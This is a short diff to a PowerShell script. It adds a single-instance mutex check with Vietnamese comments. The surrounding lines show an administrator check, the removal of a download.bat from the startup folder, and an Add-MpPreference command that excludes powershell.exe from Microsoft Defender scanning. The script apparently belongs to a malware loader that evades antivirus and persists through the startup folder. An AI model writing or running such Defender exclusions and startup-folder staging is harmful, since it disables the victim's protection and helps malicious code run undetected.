@@ -54,7 +54,25 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     }
 }
 
+$AppId = "haideptrai"
+$mutexName = "Global\$AppId"
+$CreatedNew = $false
 
+try {
+    # Kiểm tra xem Mutex đã tồn tại chưa
+    $mutex = [System.Threading.Mutex]::OpenExisting($mutexName)
+    Write-Host "[!] An instance of this script is already running."
+    exit
+} catch {
+    # Nếu Mutex chưa tồn tại, tạo mới
+    $mutex = New-Object System.Threading.Mutex($true, $mutexName, [ref]$CreatedNew)
+}
+
+# Nếu không tạo được Mutex mới, thoát script
+if (-not $CreatedNew) {
+    Write-Host "[!] Another instance is already running."
+    exit
+}
 
 Remove-Item -Path "$startupfolder\download.bat" -Force
 Add-MpPreference -ExclusionProcess "powershell.exe"
